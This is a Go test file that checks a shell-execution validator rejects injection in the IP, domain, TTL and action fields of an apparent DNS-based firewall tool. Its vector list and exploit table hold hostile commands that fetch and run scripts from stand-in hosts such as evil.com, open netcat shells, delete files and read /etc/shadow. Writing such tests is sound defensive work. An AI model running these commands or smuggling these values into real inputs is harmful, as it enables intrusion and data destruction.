package main

import (
	"strings"
	"testing"
)

// TestValidationFunctionsAgainstShellInjection tests that validation functions
// properly reject shell injection attempts
func TestValidationFunctionsAgainstShellInjection(t *testing.T) {
	// Common shell injection vectors
	injectionVectors := []string{
		"; rm -rf /",
		"&& curl evil.com/shell.sh | bash",
		"|| wget malware.com/backdoor",
		"`whoami`",
		"$(id)",
		"|nc attacker.com 1234",
		"> /etc/passwd",
		"< /etc/shadow",
		"''; DROP TABLE users; --",
		"\"; system('rm -rf /'); \"",
		"../../../etc/passwd",
		"\n\nmalicious command",
		"\r\ninjected command",
		"${HOME}/malware",
		"$USER/.ssh/id_rsa",
		"*/malware/*",
		"?malware?",
		"[malware]",
		"{malware}",
		"~/.bashrc",
		"\\x41\\x41\\x41",
		"%41%41%41",
		"\x00nullbyte",
		"\t\tmalicious",
		" malicious command",
	}

	t.Run("IP validation rejects injection vectors", func(t *testing.T) {
		validIPs := []string{
			"192.168.1.1",
			"10.0.0.1",
			"172.16.0.1",
			"127.0.0.1",
			"8.8.8.8",
			"2001:db8::1",
			"::1",
			"2001:db8:85a3::8a2e:370:7334",
		}

		// Test valid IPs pass
		for _, ip := range validIPs {
			if err := validateForShellExecution(ip, "ip"); err != nil {
				t.Errorf("Valid IP %q should pass validation but got error: %v", ip, err)
			}
		}

		// Test injection vectors are rejected
		for _, vector := range injectionVectors {
			injectedIP := "192.168.1.1" + vector
			if err := validateForShellExecution(injectedIP, "ip"); err == nil {
				t.Errorf("IP injection %q should be rejected but passed validation", injectedIP)
			}

			injectedIP2 := vector + "192.168.1.1"
			if err := validateForShellExecution(injectedIP2, "ip"); err == nil {
				t.Errorf("IP injection %q should be rejected but passed validation", injectedIP2)
			}
		}
	})

	t.Run("Domain validation rejects injection vectors", func(t *testing.T) {
		validDomains := []string{
			"example.com",
			"test.example.com",
			"sub.domain.test.com",
			"localhost",
			"test-domain.com",
			"test_domain.com",  // Note: underscores are not valid in hostnames per RFC, but we allow them
			"123domain.com",
			"domain123.com",
		}

		// Test valid domains pass
		for _, domain := range validDomains {
			if err := validateForShellExecution(domain, "domain"); err != nil {
				t.Errorf("Valid domain %q should pass validation but got error: %v", domain, err)
			}
		}

		// Test injection vectors are rejected
		for _, vector := range injectionVectors {
			injectedDomain := "example.com" + vector
			if err := validateForShellExecution(injectedDomain, "domain"); err == nil {
				t.Errorf("Domain injection %q should be rejected but passed validation", injectedDomain)
			}

			injectedDomain2 := vector + "example.com"
			if err := validateForShellExecution(injectedDomain2, "domain"); err == nil {
				t.Errorf("Domain injection %q should be rejected but passed validation", injectedDomain2)
			}
		}
	})

	t.Run("TTL validation rejects injection vectors", func(t *testing.T) {
		validTTLs := []string{
			"1",
			"300",
			"3600",
			"86400",
		}

		// Test valid TTLs pass
		for _, ttl := range validTTLs {
			if err := validateForShellExecution(ttl, "ttl"); err != nil {
				t.Errorf("Valid TTL %q should pass validation but got error: %v", ttl, err)
			}
		}

		// Test injection vectors are rejected
		for _, vector := range injectionVectors {
			injectedTTL := "300" + vector
			if err := validateForShellExecution(injectedTTL, "ttl"); err == nil {
				t.Errorf("TTL injection %q should be rejected but passed validation", injectedTTL)
			}

			injectedTTL2 := vector + "300"
			if err := validateForShellExecution(injectedTTL2, "ttl"); err == nil {
				t.Errorf("TTL injection %q should be rejected but passed validation", injectedTTL2)
			}
		}

		// Test invalid TTL values
		invalidTTLs := []string{
			"0",
			"-1",
			"86401",
			"abc",
			"300.5",
			"",
		}

		for _, ttl := range invalidTTLs {
			if err := validateForShellExecution(ttl, "ttl"); err == nil {
				t.Errorf("Invalid TTL %q should be rejected but passed validation", ttl)
			}
		}
	})

	t.Run("Action validation rejects injection vectors", func(t *testing.T) {
		validActions := []string{
			"add",
			"remove",
			"expire",
			"allow",
			"deny",
		}

		// Test valid actions pass
		for _, action := range validActions {
			if err := validateForShellExecution(action, "action"); err != nil {
				t.Errorf("Valid action %q should pass validation but got error: %v", action, err)
			}
		}

		// Test injection vectors are rejected
		for _, vector := range injectionVectors {
			injectedAction := "add" + vector
			if err := validateForShellExecution(injectedAction, "action"); err == nil {
				t.Errorf("Action injection %q should be rejected but passed validation", injectedAction)
			}

			injectedAction2 := vector + "add"
			if err := validateForShellExecution(injectedAction2, "action"); err == nil {
				t.Errorf("Action injection %q should be rejected but passed validation", injectedAction2)
			}
		}

		// Test invalid actions
		invalidActions := []string{
			"malicious",
			"DELETE",
			"exec",
			"system",
			"eval",
			"",
		}

		for _, action := range invalidActions {
			if err := validateForShellExecution(action, "action"); err == nil {
				t.Errorf("Invalid action %q should be rejected but passed validation", action)
			}
		}
	})
}

// TestExploitAttempts tests specific realistic attack scenarios
func TestExploitAttempts(t *testing.T) {
	exploits := []struct {
		name     string
		clientIP string
		resolvedIP string
		domain   string
		ttl      string
		action   string
		description string
	}{
		{
			name:     "Command injection via semicolon in IP",
			clientIP: "192.168.1.1; rm -rf /tmp/*",
			resolvedIP: "8.8.8.8",
			domain:   "example.com",
			ttl:      "300",
			action:   "add",
			description: "Attempts to execute rm command via IP parameter",
		},
		{
			name:     "Remote code execution via domain",
			clientIP: "192.168.1.1",
			resolvedIP: "8.8.8.8",
			domain:   "example.com && curl http://evil.com/shell.sh | bash",
			ttl:      "300",
			action:   "add",
			description: "Attempts to download and execute remote shell script",
		},
		{
			name:     "Command substitution in TTL",
			clientIP: "192.168.1.1",
			resolvedIP: "8.8.8.8",
			domain:   "example.com",
			ttl:      "$(cat /etc/passwd)",
			action:   "add",
			description: "Attempts to read /etc/passwd via command substitution",
		},
		{
			name:     "Environment variable injection in action",
			clientIP: "192.168.1.1",
			resolvedIP: "8.8.8.8",
			domain:   "example.com",
			ttl:      "300",
			action:   "add && export MALWARE=1",
			description: "Attempts to set environment variables",
		},
		{
			name:     "SQL injection style in domain",
			clientIP: "192.168.1.1",
			resolvedIP: "8.8.8.8",
			domain:   "'; DROP TABLE firewall_rules; --",
			ttl:      "300",
			action:   "add",
			description: "SQL injection attempt (should still be blocked as invalid domain)",
		},
		{
			name:     "Buffer overflow attempt in IP",
			clientIP: strings.Repeat("A", 1000) + "; malicious_command",
			resolvedIP: "8.8.8.8",
			domain:   "example.com",
			ttl:      "300",
			action:   "add",
			description: "Attempts buffer overflow with shell injection",
		},
		{
			name:     "Unicode bypass attempt",
			clientIP: "192.168.1.1",
			resolvedIP: "8.8.8.8",
			domain:   "example.com\u0000rm -rf /",
			ttl:      "300",
			action:   "add",
			description: "Attempts null byte injection with unicode",
		},
		{
			name:     "Multiple injection vectors",
			clientIP: "192.168.1.1|nc evil.com 1234",
			resolvedIP: "8.8.8.8`whoami`",
			domain:   "$(curl evil.com/shell).com",
			ttl:      "300&sleep 10",
			action:   "add||rm -rf /",
			description: "Multiple injection attempts across all parameters",
		},
	}

	for _, exploit := range exploits {
		t.Run(exploit.name, func(t *testing.T) {
			// Track validation errors
			var errors []string

			if err := validateForShellExecution(exploit.clientIP, "ip"); err != nil {
				errors = append(errors, "clientIP: "+err.Error())
			}
			if err := validateForShellExecution(exploit.resolvedIP, "ip"); err != nil {
				errors = append(errors, "resolvedIP: "+err.Error())
			}
			if err := validateForShellExecution(exploit.domain, "domain"); err != nil {
				errors = append(errors, "domain: "+err.Error())
			}
			if err := validateForShellExecution(exploit.ttl, "ttl"); err != nil {
				errors = append(errors, "ttl: "+err.Error())
			}
			if err := validateForShellExecution(exploit.action, "action"); err != nil {
				errors = append(errors, "action: "+err.Error())
			}

			// All exploit attempts should be rejected by at least one validation
			if len(errors) == 0 {
				t.Errorf("Exploit attempt %q should have been rejected but all validations passed. Description: %s", 
					exploit.name, exploit.description)
			} else {
				t.Logf("Exploit %q properly rejected with errors: %v", exploit.name, errors)
			}
		})
	}
}

// TestEdgeCases tests boundary conditions and edge cases
func TestValidationEdgeCases(t *testing.T) {
	t.Run("Empty inputs", func(t *testing.T) {
		if err := validateForShellExecution("", "ip"); err == nil {
			t.Error("Empty IP should be rejected")
		}
		if err := validateForShellExecution("", "domain"); err == nil {
			t.Error("Empty domain should be rejected")
		}
		if err := validateForShellExecution("", "ttl"); err == nil {
			t.Error("Empty TTL should be rejected")
		}
		if err := validateForShellExecution("", "action"); err == nil {
			t.Error("Empty action should be rejected")
		}
	})

	t.Run("Very long inputs", func(t *testing.T) {
		longString := strings.Repeat("a", 10000)
		
		if err := validateForShellExecution(longString, "ip"); err == nil {
			t.Error("Extremely long IP should be rejected")
		}
		if err := validateForShellExecution(longString+".com", "domain"); err == nil {
			t.Error("Extremely long domain should be rejected")
		}
		if err := validateForShellExecution(longString, "ttl"); err == nil {
			t.Error("Extremely long TTL should be rejected")
		}
		if err := validateForShellExecution(longString, "action"); err == nil {
			t.Error("Extremely long action should be rejected")
		}
	})

	t.Run("Whitespace handling", func(t *testing.T) {
		whitespaceTests := []string{
			" 192.168.1.1",
			"192.168.1.1 ",
			" 192.168.1.1 ",
			"192.168.1.1\t",
			"192.168.1.1\n",
			"192.168.1.1\r",
			"\t192.168.1.1",
			"\n192.168.1.1",
			"\r192.168.1.1",
		}

		for _, test := range whitespaceTests {
			if err := validateForShellExecution(test, "ip"); err == nil {
				t.Errorf("IP with whitespace %q should be rejected", test)
			}
		}
	})
}